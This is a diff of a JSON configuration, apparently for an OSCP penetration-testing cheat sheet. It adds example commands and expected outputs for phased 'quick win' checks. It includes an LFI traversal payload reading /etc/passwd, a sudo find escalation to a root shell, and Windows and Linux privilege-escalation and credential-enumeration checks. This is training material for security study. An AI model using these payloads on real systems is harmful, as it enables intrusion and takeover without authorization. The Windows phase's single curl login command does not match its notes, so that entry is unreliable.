@@ -59,31 +59,59 @@
           "title": "Phase 1: Service-Level Quick Wins (Immediate)",
           "notes": "Check before detailed enumeration. Takes 5-10 minutes total. High success rate in OSCP (40-50% of boxes have at least one quick win).",
           "commands": [
-            "check-sudo-privs",
-            "curl-post"
+            {
+              "id": "check-sudo-privs",
+              "example": "sudo -l",
+              "shows": "User <username> may run the following commands"
+            },
+            {
+              "id": "curl-post",
+              "example": "curl -X POST -d 'username=admin' http://192.168.1.100/login.php",
+              "shows": "200 OK"
+            }
           ]
         },
         {
           "title": "Phase 2: Web Application Quick Wins",
           "notes": "After confirming HTTP/HTTPS services. Common quick wins: Default credentials (admin:admin, admin:password), Exposed admin panels (/admin, /manager), Directory listing enabled, LFI/RFI vulnerabilities, Outdated CMS (WordPress, Drupal, Joomla with known exploits).",
           "commands": [
-            "curl-post",
-            "lfi-test"
+            {
+              "id": "curl-post",
+              "example": "curl -X POST -d 'username=admin' http://192.168.1.100/login.php",
+              "shows": "200 OK"
+            },
+            {
+              "id": "lfi-test",
+              "example": "../../../../../../etc/passwd",
+              "shows": "root:x:0:0"
+            }
           ]
         },
         {
           "title": "Phase 3: Post-Compromise Quick Wins (Linux)",
           "notes": "After initial foothold. Run immediately before full LinPEAS scan. Checks: sudo -l (NOPASSWD entries), find / -perm -4000 (SUID binaries), ls -la /etc/cron* (writable cron jobs), cat /etc/exports (NFS shares with no_root_squash), docker ps (Docker group membership).",
           "commands": [
-            "check-sudo-privs",
-            "sudo-exploit-find"
+            {
+              "id": "check-sudo-privs",
+              "example": "sudo -l",
+              "shows": "User <username> may run the following commands"
+            },
+            {
+              "id": "sudo-exploit-find",
+              "example": "sudo find . -exec /bin/bash \\; -quit",
+              "shows": "bash-5.0# prompt (root shell)"
+            }
           ]
         },
         {
           "title": "Phase 4: Post-Compromise Quick Wins (Windows)",
           "notes": "After initial foothold. Run before full winPEAS scan. Checks: whoami /priv (SeImpersonatePrivilege = potato attacks), accesschk.exe -uwcqv (unquoted service paths), reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated (MSI privesc), net localgroup administrators (admin group membership), cmdkey /list (stored credentials).",
           "commands": [
-            "curl-post"
+            {
+              "id": "curl-post",
+              "example": "curl -X POST -d 'username=admin' http://192.168.1.100/login.php",
+              "shows": "200 OK"
+            }
           ]
         }
       ],
